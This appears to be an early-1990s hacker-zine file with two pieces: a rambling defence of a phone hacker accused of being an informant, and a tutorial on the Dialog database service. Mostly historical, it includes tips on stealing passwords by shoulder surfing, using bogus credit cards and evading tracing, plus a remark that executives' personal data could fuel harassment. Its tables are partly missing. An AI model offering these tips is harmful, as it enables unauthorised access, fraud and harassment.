 currently being spreading around the net.  Bear in mind that
 this file is exactly as he wrote it.  (IE: no spell-checking
 or other editing has been done.)

 I want to add something from my own personal experience with
 Traxxter.  At Comsec one evening, we received a phone call from
 Pat.  Scott and I took the call and listened to Pat for nearly
 an hour.  During this call Pat continually over-stressed the
 point about how much he hated being called a narc.  He said
 &quot;I know you guys understand about turning people in, now that
 you are doing Comsec.&quot;  In his thinking that by our new charter
 as security consultants we were suddenly policemen as well,
 he went into a big spiel about his involvement with security
 officers at long distance carriers and how he regularly provided
 information to them.

 Now, you may feel that whatever transgressed between Pat and
 the locals causing him and his family so many problems
 may or may not warrant the action that was taken by them.
 I personally follow a simple rule regarding such things:
 If you mess with me at home it&#039;s just a pissing match and I&#039;ll
 insult you back night and day, but if you try to come between me
 and my livelihood or my ability to work or put food on my table
 I&#039;m gonna put you in jail.  Obviously I&#039;m not the only one
 who feels that way.

 In all honesty, I could care less about this, but since Pat
 submitted this file to Phrack, I am going to give it fair
 treatment and publish it for him.]

-----------------------------------------------------------------------------

                      Visionary The Story About Him.


This file is beeing published due to the wide spread rumors about a hacker known
as The Visionary.  The reason behind the distribution of the file is to clear up
a lot of misconseptionspeople have about this individual.  Those reading it are
asked to keep an open mind.  Encluded in the file will be buffers from people
who know The Visionary.  After reading it there is hope the rumors come to an
end.


     There have been a number of stories that people have brought up in relation
to The Visionary.  So you will hear the truth in relation to each story.  Many
have been spreading rumors without getting the facts first, so therefore a lot
of stories going around were either overdramatised or without foundation.


     The first thing that originally started the rumor was an event which
happened in the mid 1980s.  The Visionary had been modeming for just over a year
back then.  He as well as several other people had become associated with some
other local hackers.  The local hackers in question were, Oedipus Rex who ran a
board known as The Apple Tree in 305.  The other two were known as Unknown
Soldier of LOD and a guy known as The Technician.  There were a couple others
involved with them but the identity is not known.  Anyway they became angery at
the other hackers I knew and started unnecessary problems.  Unknown Soldier
giving out the number to his other friends in order to harass a kid known as The
Insider.  Every time Insider had his number changed to a nonpublished one,
Unknown Soldier loged into Cosmosand using his knowledge obtained the new number
At the same time Oedipus Rex along with his friends were pulling other serious
things on me as well as the local people I knew.  1.  He would harass me and my
parentsall times of the night.  On two ocations he was seen driving in my
neighborhood on the same night someone shot my front windows out.  It was shown
the Unknown had logged on TRW and obtained the credit history belonging to my pa
parents as well as otherpeople&#039;s parents.  On one ocation Oedipus Rex with a few
others had convinced a few of my friends to meet them at a remote location
after a hacker meeting.  When this happened OedipusRex sprayed the people with a
substance known as mace.  This amoung other things like, property damage, credit
information being changed and other acts of anarchy were performed against us.
I The Visionary don&#039;t know why they started on me as well when I did nothing to
diserve this.  Things come to ahead when The Unknown Soldier bragged to one of
us that he could get confidential information on their parents.  The kid he was
bragging to went to his parents because there was already problems.  His father
got the local Bell operating company involved and things progressed from there.
Inside five months Unknown Soldier was busted and charged with illegal entry
into Suthern Bell&#039;s computer and CBI credit bureau.  He had to pay $1,500 to
both Bell and CBI indamages.  It&#039;s not known how much the state fined him.  It
was shown that The Visionary&#039;s parents credit history was effected in a negative
way by this guy.  After the bust the local authorities spoke to The Visionary in
regards to this guy.  Now any hacker out therewith any common sense can
understand why Visionary did not hold back when asked about these guys.  As any
hacker knows nobody should use their knowledge against someone else.  Especially
if they are going to use the parents as the target.  Visionary was more than in
his rights to do what he did.  And due to the fact this story was told without
the entire facts known it has been twisted into a gross rumor.


     For about two years after that Visionary dropped out of the seen due to
person reasons.  In late 1987 he returned back in the seen as The Traxster.  At
there were no rumors until Lex Luthor of The Legion of Doom found out about him.
Than the rumors started again.  &quot;I don&#039;t know why people brought up the event
which happened years ago when it was long and forgoten,&quot; is one thing The
Visionary said.  From 1987 throughout 1988 a lot of people always spoke of
Visionary back than known as The Traxster.


     In the last four years certain things have been brought to light regarding
Visionary.  These events were generally recordings of Visionary either admitting
to being a narc, or one was of him talking to a suposed MCI Security agent.


     When you read the following accounts, remember logic will play a big part
in not onlyunderstanding the truth behind them, but you will find out that
Visionary&#039;s side is a lot more credible than of the rumors.


     The following is Visionary&#039;s own account in relation to the MCI tape that
a lot heard but don&#039;t know the facts behind.  &quot;It was during the early of sumer
of 1988 when I had an interesting incounter with a hacker posing as an MCI
Security agent.  I didn&#039;t know it at the time but someone was oviously playing a
large trick on me as it was recorded either by the hacker or a person on his
threeway.  Those reading this keep in mind I am going from memory and I may not
be able to recall every small detail.  I will say this much, I have the
tape of the event that I obtained and anyone who listens to it will know that
is no MCI agent I am talking to.  I had one ocation where I was due to meet
someone on a loop.  Which loop and who I was supose to meet I don&#039;t recall.
Anyways I had been on a loop waiting for another hacker.  After a minute a guy
comes on the loop.  Upon asking his handle he said he was from MCI Security.
At first I laughed and asked who he was kidding.  I mean people MCI isn&#039;t going
to call a loop and identify themselves as such.  Well I decided after he
insisted very sincerely he was MCI, I decided to play along.  I made up the
story that I was someone that delt with telco security and wouldn&#039;t mind talking
to him.  We started talking about things like ANI and different services.  Keep
keep in mind I know he wasn&#039;t MCI at all.  The conversation lasted around thirty
to fourty-five minutes.  I am able to give some idea of time beings I have the
tape and have listened to it.


     After the event I forgot about the entire thing.  It wasn&#039;t until a few
months later when I heard about the recording with me talking to MCI.  At first
I was extremely puzzeled by this news.  Than I heard samples of the recording
and instantly knew what it was about.


     Now when listening to the tape you will find a couple things very strange
about it.  When people told me about it, I was told that someone had remobed my
line, someone had used LMOS and other outlandish things.  When listening to the
tape the first thing that is ovious is the suposed MCI guy I am talking to is
much louder than me.  I mean you can hear him booming compared to my side of the
conversation.  The second thing is you hear music in the background.  The last
fact mentioned is not important but could be if you listen to it.


     This tape caused a lot of people to have second thoughts of associating
with me.  When one hears it, usually it sounds pretty real if you make a quick
judgement.  People such as Phiber Optic, Zod of MOD and even a local friend of
mine who knew me for a long while were convinced by it.  I feel that either
someone had either played a bad trick on me, or it was a situation where two
people happened to find me and I become an unfortunate victom.  At the time the
rumors had pretty much stopped and if the tape hadn&#039;t come about I suspect
things would have blown over.


     The second event involving me on tape, was with me and Doc Haliday.  It was
in the fall of 1990, during the time of the 404 bridge.  The rumor about me had
still been going on due to the MCI tape.  One of the hackers that happened to
call the bridge was Doc Haliday.  Doc Haliday is a somewhat wellknown hacker who
associates with people in the Texas area.  He was known to frequent a HP board
known as Unholy Temple, and he has also written for Phrack.  One particular
ocation, Visionary was on the 404 bridge he met Doc Haliday.  Doc Haliday called
him shortly after they met on the bridge.  The first conversation was about the
rumors he heard about Visionary and his thoughts on them.  Haliday than related
to Visionary that he didn&#039;t aprove of a lot of hacker activity now a day.  He
said in so many words the stuff hackers seemed to do was extremely wrong.  This
statement didn&#039;t hit Visionary quite right, due to the fact Doc Haliday had been
into hacking a long time.  Doc Haliday&#039;s next statement made Visionary feel
there was more  to him than met the eye.  &quot;I don&#039;t aprove of those who use
access devices,&quot; stated Doc Haliday to Visionary.  Now anyone reading this may
know it, but the term access devices or access codes is the legal term the
authorities use in court cases.  When Visionary heard this, the first signs of
dout about Doc Haliday began.  &quot;When he used the term access devices, an allarm
bell went off in my head,&quot; was Visionary&#039;s words.  The next day, again him and
Doc Haliday had another conversation.  This is when Visionary had his douts
confirmed.  Haliday started out by informing The Visionary of an investigation
on the 404 bridge.  He said a friend of his from The Secret Service had warned
him, due to an inpending bust of a number of people.  This news shocked
Visionary like a slap in the face, and things started getting stranger.  Doc
Haliday explained there was a lot of monitoring of the bridge, as well as a
pending investigation on Super Niggar.  At this point Vision made a decision to
play his Trump card.  Slowly Visionary was able to get Haliday to admit that he
did next to nothing illegal any more.  When asked Haliday gave an impression he
was not against informents but was open to it himself.  This is when Visionary
began to lead Haliday to the belief that he was an informent.  Haliday bought
the bate hook line and sinker.  He told Visionary all about the dealings with
Secret Service in the past, and how he had made six federal cases for them thus
far.  Visionary made up a story to the effect of him beeing involved in simular
activities.  The entire thing on Visionary&#039;s part was to confirm his own douts
regarding Haliday.  However one thing happened which screwed up Visionary.
Doc Haliday had been recording the entire conversation.  After he hung up from
Visionary, he proceded to play it to everybody.  His reason for saying what he
said was to bolshit Visionary into admitting to narcing.


    All of y     The people that heard the tape were not able to hear the entire
thing.  Haliday only played segments and made himself the big social enginer.
Some of you out there may ask, who should believe?  Well look at it this way.
if you hear the tape or hear Haliday&#039;s side it sounds like he is bolshitting
Visionary.  However again like the other time to many things don&#039;t tigh
together.  First off Visionary, if he was an informent would not admit to
anybody as such.  It may seem to some that a confidents was built but Visionary
would not be that stupid.  Remember people he has a lot of rumors go around
about him.  A couple other things come into play here.  Doc Haliday was a very
smart and carful individual.  He didn&#039;t associate with any of the normal crouds,
nor did he even associate with most better hackers.  So, ask yourself, why did
he go to such length to expose what he thought was a narc?  Visionary didn&#039;t
even talk to anyone Haliday knew nore did Visionary pose a threat to Haliday.
A major thing all of you will remember, is Doc Haliday is part of the security
firm known as Comceck in Texas.  This is not mean much on one hand, but Haliday
is involved with computer security.  Visionary was bolshitting Haliday and when
looking at the situation the truth speaks for itself.  Any of the higher up
hackers don&#039;t concern themselves with such matters of a narc.  They don&#039;t give
two shits about lamers, yet Haliday tried to convince all of them with his
tape.


     Thus far you have read the main three reasons Visionary has had the
constant rumor which persists about him.  Now we will cover some of the little
reasons that, may not deal with tape recordings, can be misunderstood as fact.
One must take into consideration that Visionary had to put up with a lot of shit
due to the rumors, and he had to do some interesting stuff to get by.  One
thing he did, was to let certain hackers think he was a narc.  All of you out
there will ask why would he do this?  Well it&#039;s simple.  Visionary ran acrossed
some people that it was to his advantage to let them believe anything.  One
case with the members of a group known as MOD.  MOD was known by many to harass
a lot of people.  They had heard about Visionary, and believed that to harass
someone in his line of work would be the death of them.  Anotherwords, if you
are a neighborhood vandle, your less likely to bother an authority figure.  To
them Visionary was an authority figure.


     That was not the only ocation Visionary had let people believe he was
an informent of some kind.  Visionary found it was easier in some instances
if certain people were set on believing the rumors, that they were better off
deceived in that way.  Certain people, Visionary found would trust him more if
they thought he worked for a certain ld service.  One particular instance,
involved a local friend of Visionary&#039;s.  The kid, had heard a lot of rumors.
Visionary had got him started in the shit, but what convinced the kid was the
famous MCI tape.  Visionary, finally told the kid he worked for MCI, and no
government agency.  When the kid in question heard this he was able to talk
to Visionary easier.  The logic here, is the kid didn&#039;t know what Visionary did.
If he did work for the FBI or Secret Service, he felt in danger by that.  But
As the local kid didn&#039;t use MCI it made him trust Visionary.  See people there
was the same reason Visionary told several people that.  People, like that kid
as well as others didn&#039;t care what Visionary did.  Also Visionary at times
would bolshit someone into thinking he was a government narc to get a reaction.
&quot;You would be suprised as to the number of people who actually wanted to narc,&quot;
was Visionary&#039;s statement.


     Over the years Visionary has been the target of many a accuation.  Many
of those who know Visionary, know he is no narc, and never has been.  Visionary,
feels that people have been to quick to judge him, and he asks to just keep
an open mind.  The rumors about him are bolshit, as a number of facts will show.
The facts which are a lot more credible stand a lot stronger than the rumors.
1.  Many people Visionary has associated with have not been busted.  This
statement may not mean a thing, but it&#039;s going to be ovious if he is a narc a
lot of his friends would go down.  Visionary talks to everybody, therefore  you
know that he will know some who have been busted.  But the number are few, and
when you talk to several who have known him, they will admit no Secret Service
or FBI have shown up to get them.  Logic to some may not dictate reality, but
it makes sense and has proven to be true.  Take a look at people like, Fourth
Reich, Gandalf, Lord Sigath, Hellmaster, The Phlaw, Renegade and Weirdo.
All the people have been around for a long time, and associated with Visionary.
So ask yourself, why, if Visionary is a narc are they not busted?  The answer
is plane as day.

     There is one major thing that needs to be covered in this file.  The event
I am refering to happened during the sumer of 1990.  It waa around the time of
the 702 bridge.  There was a guy going by the handle of Storm Shadow around.
Storm Shadow lives in the New York area and Storm ShadowVisionary first knew
Storm Shadow in late 1989.  Some people that knew this guy would say he was a
bolshit artist, who didn&#039;t come through.  Storm Shadow had aproached several
people he knew with a deal involving information providers.  The deal was he
worked for a private investigator.  The type of work Storm Shadow clamed to be
doing was nonhacker related cases.  He clamed it was just people he needed to
obtain records on various things such as, Social Security records, local usage
dialing records, CBI and TRW records, LD records as well as other things.  He
made offers to a number of people like Visionary, Toxic Roadkill, Code of Honor,
Nemesis, Joe Friday, Billy The Kid as well as others to work for him.
When he tried to get Visionary involved, he didn&#039;t have a lot for it.  Storm
Shadow asked Visionary to find people to help him out.  Visionary introduced
Storm Shadow to a few people explaining what Storm Shadow&#039;s problem.  At this
point Visionary just left it up to the people.  One thing that should be
understood, is Visionary had no notion that Storm Shadow wasn&#039;t anything beyond
what he said.  Some of the people like Toxic Roadkill, Joe Friday and Code of
Honor did do some work for Storm Shadow.  This thing went on for a few months
ooff and on from late 1990 into 1991.


     Recently certain things came to light regarding Storm Shadow.  In the fall
of 91, there were a few people busted in the New York area.  Storm Shadow and
a guy known as Renegade Hacker were among the people.  It appears Storm Shadow
is a witness for the government against some of the others busted.  It&#039;s
been thought by a couple, that Storm Shadow was gathering evidence against the
people he tried to get working for him.  This in itself didn&#039;t make Visionary
look very good, as he introduced Storm Shadow to a number of people.  You see
once again, Visionary is going to get blamed wrongfully for something not in
his control.


     Gentleman, after reading the accounts above you may understand Visinary&#039;s
anger when someone calls him a narc.  Rather by his own falt, or just the
manor of things, Visinary has not been treated fairly by the HP communinity.
It&#039;s not fair that people look at him differently.  Just because he may not be
like everyone else is no excuse.


     Recently, people have been spreading a lot of rumors without hearing
Visionary&#039;s side.  Recently, people will produce what they call evidence without
allowing him to explain.


     A lot of statements, and information have been passed among people, that
when you look at it means nothing.  People say they&#039;ve got Visionary on tape
admitting he&#039;s a narc.  Visionary has bolshited people before, and the plane
fact is someone was taping him.  People will bring up the fact Visionary has not
been busted.  Just because the guy hasn&#039;t been busted doesn&#039;t mean anything.
Visionary is not always active, therefore isn&#039;t always at risk.  Some people t
will wonder why someone Visionary&#039;s age, 27 years old is in this stuff.  Some of
the most wellknown hackers are in their twentys, and some are even in the
early thirtys.


     One major fact, that has been brought up about Visionary will be addressed
now.  Some people, with good reason, may want to know the reason behind this
major fact regarding Visionary.  One question, that has come up from time to
time, is what does Visionary specialize in relation to hacking.  Some wonder
what Visionary does in the hack/phreak world.  Gentleman remember Visionary is
handicapped as well as visually impaired.  Being blind kind of makes his
resources kind of limited in reading files.  He uses an Echo Speach Card with
limited software.  Not just any program will work with the speach card.  The
Echo takes text and speaks it OK to a point.  But when reading stuff from a
text file, the words are not spoken properly.  Some symbols aren&#039;t pronounced
therefore making things even harder.  When on a Unix system it&#039;s rough because
the commands aren&#039;t spoken like they should be.  The main thing Visionary is
good at is the social enginering aspect.


     Let&#039;s keep in mind no matter how someone goes about learning, it does make
them any different different.  Visionary should be looked upon as a shady
character just because he may be curious.  He has to learn by asking questions,
where all of us take the ability of reading for granted.


    The reason this file is being widely spread, is in hopes some of the
slandering of Visionary&#039;s name can stop.  &quot;The computer and the telephone are
my best sources of entertainment.  I enjoy hacking as a hoby and do not
appreciate the continuing rumors people spread.&quot;  fter


    The main thing here, is every time some strange event happens in the seen,
people point the finger at Visionary.  Let&#039;s stop the shit, let&#039;s stop assuming
he&#039;s the guilty one.  Recently Visionary was blamed for a bunch of people being
on Alliance Teleconferencing.

                  Searching the Dialog Information Service
                               By Al Capone
                      (alcapone@mindvox.phantom.com)

     This file will show you how to use the Dialog Information Service.
It is divided into the following parts:

&lt;&gt; --- Background Information
&lt;&gt; --- Accessing Dialog
&lt;&gt; --- What to do when you&#039;re in
&lt;&gt; --- Searching and Search Strategy

     As loyal Phrack readers may recall, there have been two articles
written about Dialog already: Control-C wrote &quot;Inside Dialog&quot; in Issue
9 and much later Brian Oblivion wrote &quot;The Complete Guide to The DIALOG
Information Network&quot; in Issue 39. Why another one? The online world
changes so rapidly that things written just a couple of years ago can
be out of date today. What differentiates this file from its two predecessors
is that this file is: less &#039;manual derived&#039;, current (as of 11/93),
more hands on, and hopefully is easier to read and put to immediate use.

&lt;&gt; Background Information
-------------------------

&quot;The United States is turning from an industrial age nation into
an information age nation,&quot;  U.S. Senator Gary Hart, The Tonight
Show, 1993.

     From Big Brother creating dossiers on subversives to credit
reporting agencies determining whether or not you get your credit
card application approved, it all boils down to the more you know,
the better you are able to succeed in society.

     Following through a hacker progression, huge databases have
amassed providing online access to a seemingly infinite number of
sources used for anything imaginable.  Lawyers can access these
databases to research such things as precedents for court cases. A
graduate student trying to earn his or her masters degree can gain
access to research a thesis, companies can get information on
competitors, and so on. Databases are distributed into two categories:
Research and Entertainment.

     Gaining prominence in the early 1980&#039;s, entertainment databases
were comprised of the big two: The Source and Compuserve. Another
prominent service, the Dow Jones News Retrieval Service was part
research and part entertainment.  A few other less significant databases
also existed at this time.

     The Source was a subsidiary of the investment firm of Welsh,
Carson, and Stowe.  It provided some seven hundred and fifty features
and services including electronic mail.  Investment features included
a discount brokerage firm, and a full range of stock, bond, and
commodities information, with an option to search portfolios.  It also
allowed you to search other fellow users by location, account number,
or interest.  The Source was subsequently bought out by Compuserve
and was shutdown on August 1, 1989.

     Compuserve is a division of H&amp;R Block. It is the largest
service worldwide offering some four hundred thousand subscribers a
variety of news and financial information.  It also offers access
to Valueline and the Standard and Poor databases, which are online
business references.  It also has online games and a travelling service.

     The Dow Jones News/Retrieval is a part of the Wall Street Journal
and provides online abstracts of printed papers published by Dow
Jones and Co.  It now includes profiles of over forty six hundred
companies and has diversified to provide sports coverage.

     Today, most of you are aware of the myriad of other entertainment
online services such as Genie, Prodigy, America OnLine (AOL), etc. All
of these so called entertainment services have made attempts at
offering various business and research services to their users. Its
interesting to sit back and watch how each one tries to out-do the
other. You will find that some databases are offered through some of
these entertainment services as well as dialog and perhaps other
commercial services. Be aware that the costs may differ substantially
among them for the same exact database. If you are paying for access, be
sure to shop around if the particular database is popular.

     If you travel to your local university library you will notice
computer databases to which you can access such things as doctoral
dissertations (get brownie points by telling your professor how
interesting his/her thesis was), medical research (look up that newly
acquired disease that your doctor mumbled that you now have), even
national newspaper articles. This is just another source of information
at your disposal (aside from books that is).  Popping up more and
more in libraries are &quot;fee based research services&quot;.  These are simply
professional librarians who use research databases to retrieve the
information you are too ignorant or stupid (or don&#039;t have enough time)
to retrieve yourself. Fees range from their cost only (ie, online charges)
to upwards of $100. per hour of their time spent PLUS any online
charges.

     As you can probably deduce, it would be cost effective to use every
possible free source of information before turning to online searchers.  I
recommend exhausting all the in-library databases before going online
simply because the in-library databases are usually available on
CD-ROM and you are not charged an hourly rate to use it. And don&#039;t
forget about all those free Internet FTP sites, Gopher, WAIS, WWW, and
even usenet!  Most librarians are just starting to pay attention to and make
use of the Internet. However once you have read this article you
will be well versed on one of the major databases that is being used by
these research services.  If you run into an online database
in your library, I suggest that you know what you are doing, as
librarians are very skeptical due to the fact that you are using their
money to do your searching.

     Running a research service seems to be a good idea.  Not
only does it provide a &quot;legal&quot; form of hacking to satisfy your
thirst for information, there is definitely a substantial amount of
money to be made.  Entrepreneur magazine lists it as being in the top
ten of prospective business opportunities.  You are professionally
known as an information broker, a degree in Library Studies (a
traditional four year degree) helps, and if you don&#039;t decide to pursue
the research angle, you could then become a librarian (how exciting).

     One of the research databases commonly used is the Dialog
Information Service.  Dialog is a subsidiary of Lockheed Missile and
Space Corporation.  It provides access to more than three hundred
databases containing over one hundred million records.  The
significance of this service is that it joins all 300+ databases
together, you can skip from one database to another simply by
&#039;beginning&#039; the database.  In the past, the user would have to
individually call each database and pay an exorbitant charge to
use it.  Dialog eliminates this and keeps all the databases
together.  Because of the vastness, all sources are summarized
with keyword searches.  Dialog has substantial signup charges
($295. last time I asked them) in addition to the fact that
each individual database charges an hourly rate.  Each rate varies
according to things like the relative importance of the topic,
cost to put the information online, and the main determining
factor: what they think the users will pay. Some database
providers seem to defy any logical reasoning as to how they
determined the cost to access their information.

  Dialog can be accessed in about a dozen different ways.  It is
available through Westnet, Wangpac, Dunsnet, IBM Information Network, and
TWX-TELEX.  The following chart lists some other alternatives along
with connection rates:

     The following three scenarios will show you how to log in
to Dialog to begin your searching. [] denunciates what you

PLEASE LOGON:

ENTER PASSWORD:
?XXXXXXXX [Enter the Dialog Password]

You&#039;re In!

     Here let me say a few things about getting a correct
logon/password combination.  In order to familiarize yourself
with the system, Dialog gives you a starter kit which includes
your legit logon/password, along with some other perks like some
free online time.  This online time can be used the minute you
get your starter kit.  You may also illicitly obtain a correct
logon/password combination using such an elaborate technique as
looking over the shoulder of the person typing it in (shoulder
surfing).

     Of course Dialog will immediately revoke the &#039;hacked&#039; account the
minute that the &quot;scheme&quot; is uncovered, but at least you will have by then
done your research and quietly slipped away.  Keep in mind that network
nodes send port identifiers and if you are using a bogus credit
card, then you might be in some hot water should they decide to
track you down. It is assumed that if you intend to gain unauthorized
access, you are somewhat versed in the various methods to negate
the &#039;tracing&#039; capability of the network(s).

     Dialog offers 6 &#039;free&#039; accounts to prospective and current
subscribers.  These are restricted accounts which provide access
to their ONTAP training databases. There are two to three dozen
databases which they scale down to include a fraction of the
number of records and/or contain dated records from years ago. You
search these databases the same way as the full-scale ones.  The
purpose is for you to verify your search strategy, and once you feel
confident that your search strategy will pull up the info you want
(not too many records yet not too little), you use your dialog
account to access the same database at the going rate. This way,
you don&#039;t lose lots of cash if you screw up, because you made all
your mistakes using the free accounts. Since I use the free accounts
on occasion, I don&#039;t think it would be a good idea to list them in
this file. Suffice it to say that Dialog is happy to provide the
phone number to you that has the pre-recorded userid and password
combinations for the ONTAP accounts. Note that these passwords are
changed every month, with new passwords being provided at the first of
each month and that only one person may use each account at a time.

     Also note that Dialog occasionally offers a &#039;free file of the
month&#039; in which you use your normal Dialog account to do searches in
the particular database. They usually allow you to rack up to $50 or
sometimes an hour&#039;s worth of search charges -- I guess that is Dialog&#039;s
definition of &#039;free&#039;. The only charges you pay when you access any free
files of the month are telecommunications charges (see Table 1 above).
Once you leave the free file of the month, you will start to incur
normal Dialog online time charges.


&lt;&gt; What to do When You&#039;re In
----------------------------

     Once you have gained access to Dialog the system will show
you something like this:

SYSTEM:

     The &quot;SYSTEM:&quot; prompt directs you to pick a file.  A file in
this case is the number to a database.  In the above welcome message
you will notice that the St. Petersburg Times appears in File 735.
This simply means that if I wanted to look up an article in the St.
Pete Times, I would type in &quot;b735&quot; at the &quot;SYSTEM:&quot; prompt.  The &quot;b&quot;
stands for begin, as if you are beginning in that database.  Like I
said earlier, each database charges a different rate which typically
depends on the &#039;importance&#039; of the information.  Therefore, it will
probably charge more for biochemistry information than for newspaper
articles. The following list shows costs for the some of the &quot;A&quot; databases
in the Dialog system.

     HOMEBASE is the Dialog tutorial.  It provides all sorts of help
needed by the beginner hacker...errr user.  Homebase lists announcements,
dates and locations of training seminars ($70 to $140 for half/full day
seminars, I have been to a few for dialog and some of their individual
databases and highly recommend going especially if they are offered for
free), and lists dialups in various area codes.

     This list continues for some fifteen more databases (those
that start with the letter A).  If I were to list the entire database
list, this covers some ten pages of documents, not withstanding
that it&#039;s constantly being revised/updated.  If you look at my example
in logging on, the St. Petersburg Times was recently added as a database.
This would not reflect in my database list as I have compiled, outdating
it before I even listed it.  I suggest that you contact Dialog at the
phone/address at the beginning for an updated list of databases.  The
document is called &quot;Price List&quot;.  However Dialog has online an entire
list of all its databases.  This list is located in File 411.

     Also contained in this list is the Dun and Bradstreet databases
(Files 514 through 522).  Dun and Bradstreet provides corporate
information to subscribers.  It can be used for anything from
competitive intelligence on another business to credit reports on
prospective clients to background intelligence.  File 519 contains full
disclosure on financial information on a company.  Each record costs $106.
(at this time).  The other databases are significantly cheaper, but not
by much. The way D&amp;B gathers this information is they send out employees to
&quot;interview&quot; various corporations and their officers and simply translate
the info into a record which they then market.  One thing about each database
is that they each contain their own language within the general Dialog
language (which will be discussed further in this file).  In Dun and
Bradstreet you can search by company, PIC and SIC codes (these are simply
manufacturing categories which the searcher can use to find companies.
Example: if I wanted to find the top ten companies in long-distance
services, I could use a PIC code), or various other categories.

Record 519 goes on and displays news and personal information on
the executive officers, including the following:

     At divestiture, AT&amp;T transferred to this corporation its 100
ownership in South Central Bell Telephone Company, Southern Bell Telephone
and Telegraph Company and Bellsouth Mobility Inc.
     Shareholders of AT&amp;T as of Dec 30 1983 received one share of
Bellsouth stock for every 10 common shares of AT&amp;T stock.
     Business started 1983.  The common stock is listed on the New York,
Boston, Midwest, Pacific and Philadelphia stock exchanges under the symbol
&quot;BLS&quot;.  As of Jan 31 1993, there were 1,286,670 shareholders of record. The
majority of the outstanding common stock is owned by the general public.
Officers and directors own less than 1 of the outstanding stock.
      ............RECENT EVENTS.........
      In Jan 1992, the company and RAM Broadcasting Corporation formed a
business venture to own and operate certain mobile data communications
networks worldwide as well as certain cellular and paging operations in the
US  (Further details on file at the Woodbury, NY office of Dun &amp; Bradstreet).
     During 1992, the company made several small acquisitions, principally
related to cellular phone service.
     On Sep 20 1991, the company acquired several properties in Indiana,
Wisconsin and Illinois from McCaw Cellular Communications, Inc in exchange
for $361 million, including BellSouth&#039;s interest in Rochester, NY&#039;s
non-wireline cellular provider.
     On Sep 17 1991, the company completed the acquisition of Graphic
Scanning Corp for an adjusted total cash purchase price of $168 million.
In addition, certain liabilities of Graphic Scanning amounting to
approximately $142 million were assumed by BellSouth.
    On Mar 28 1991, the company acquired from GTE Mobilnet Incorporated
two cellular partnerships in which it held minority interests, which
resulted in BellSouth Enterprises, Inc gaining an additional 21 interest
in the Atlanta-Athens Limited Partnership and an additional 42 interest in
the Lexington, Kentucky MSA Limited partnership.

Explanation of Bellsouth search results:
----------------------------------------

    WOW! All they made in sales was 15 billion dollars -- and they call
hackers crooks.  The data showing the news is helpful, and all
the personal information could really be used for harassment purposes if
necessary.  Take a look at their credentials.  A prospective employee
could use this data to ass-kiss a little.  Their college references
clearly show why the E911 document created such a fiasco in the company....


&lt;&gt; - Searching and Search Strategy: Contrived and Free Text Searching
---------------------------------------------------------------------

     There are two different types of searching to find the topic you
need: contrived and free text.  After selecting the &quot;file&quot; or database
number that you want, Dialog gives you a &quot;?&quot; as a prompt.  At this
point you can begin your searching.

     Contrived word searches should begin offline though.  The database
in question will send you a thesaurus (for a fee usually) which
will tell you exactly what words correlate with your topic, so that
you can go directly to the topic eliminating a lot of extra online
time.  Keep in mind that each database has a different thesaurus
so unless this database you have chosen is going to be your primary
database of use down the road, then you may want to just use free
text searching.

     The only problem with free text searching is if your word is
anywhere in an article it is counted and shown to you whether
relevant or not.  Imagine searching for the word &quot;aircraft&quot; in an
aeronautical database or &quot;student&quot; in an educational database.  The
result could be apocalyptic as you would have to sort the data by
its relevancy or irrelevancy.  That is why you need to develop what
is called a &quot;search strategy&quot;.  Although Dialog permits you to expand
a too narrow search or condense a broad search, a perfect strategy will
not require the use of these commands (I will discuss them later though).
A perfect strategy is both effective, time efficient, and doesn&#039;t
generate too many headaches.

     The only things I feel that a search strategy needs to be considered
a good one is the correct use of the system&#039;s language (you need to know
exactly what you are typing in and why, just as with any other language -
Fortran, C, etc.) and a synonym dictionary.  Occasionally my mind will go
blank in searching through a database for a topic because once I have
input the primary topic, I run out of ideas with which to draw
correlations.  That is why you need the dictionary.  If I were searching
with the word &quot;student&quot;, I could use the word &quot;pupil&quot; and &quot;scholar&quot; as
other points of venue to search with after I have looked up &quot;student&quot; in
the dictionary.  By using this technique, you are sort of using a
modification of the contrived word search as the costly thesaurus
does the same action as your two dollar synonym dictionary.

Beginning Your Search: The SELECT Command
-----------------------------------------

     After completing the login procedure, began the database that
you want to search, and viewed the welcome banner, etc. you will
be shown the following message:

Set  Items  Description
---  -----  -----------

?

This question mark tells you to start your search.  Functionally
the Select command will search through the database looking for the
terms that you have specified.  The correct way to do this is as
follows:

? S [term]

ex.  ? S COMPUTER

Although very broad, the select command will search the entire database
for the word &quot;Computer&quot; and will compile a total list.  It will
display it to you as the following:

? S COMPUTER
   S1 27263  COMPUTER

After each search the S# will increment itself by one.  What this
does is ease in the resurrection of searching.  If I ever wanted to
use the word &quot;Computer&quot; again, all I would have to type in is: &quot;S1&quot;
for an easy substitution.  Especially when I am using CD-ROM, I like
to use a very broad topic to begin my searching, and then I will narrow
it down.  The word &quot;Computer&quot; fits this description.

Adding meaning to the SELECTion
-------------------------------

     Here I would like to talk a little about the words &quot;and&quot; and
&quot;or&quot;.  These words are definitely the most important words to search
with.  Specifically they will narrow down your search because you
are using one more word to help you find and article.

ex.  ? S COMPUTER AND CRIME             or          S S1 AND CRIME
        27263  S1
        356    CRIME

        S2  49 S1 AND CRIME

Notice how &quot;CRIME&quot; had 356 articles that contained its word, however
when combined with the word &quot;Computer&quot; only had 49!  This makes it
very easy to narrow your search down to specifics, but not all the way
as I will further explain.

     Another command I would like to discuss is the &quot;SS&quot; command.
This is an abbreviation of the Select command known as &quot;Select Steps&quot;.
What this does is break up a search into individual steps.

ex.   ? SS COMPUTER AND CRIME
          S4  27263  COMPUTER
          S5    356  CRIME
          S6     49  COMPUTER AND CRIME

This is specifically used if I want to individualize a search and
use the terms for other topics.  Keep in mind that the assigning of
these steps and the individual searches that it must conduct may
result in slower processing times thereby running up your total
online bill.

     When Dialog is asked to do a search, it retrieves the following
in what is called fields: Title, Abstract, Descriptors, and Identifiers.
The two most important fields are the descriptors and identifiers.
When scanning a database that has come up with fifteen sources the
easiest way to determine if these articles are worth keeping or
tossing into the circular file is through the descriptors and
identifiers.  The &quot;Descriptor&quot; will in two words or less explain the
entire article, which is why they are otherwise known as the controlled
vocabulary terms.  Identifiers, on the other hand, are the free language
terms.  These are the ones we can relate to on an easier plane.  You
can also search specifically for descriptors or identifiers as well as
a lot more terms by the following commands.

Ex.  S COMPUTER AND CRIME/DE

This will search for computer and will use crime as a descriptor.  /ID
works as well for identifiers.  Other suffixes can be used as according
to the following table:

                         Index Listing - Part 1
                                Table 3

+--------------------------------------------------------------------------+
| Suffix |     Field Name     |     Indexing     |   Examples              |
|--------|--------------------|------------------|-------------------------|
|  /AB   |     Abstract       |      Word        | S COMPUTER AND CRIME/AB |
|        |                    |                  |                         |
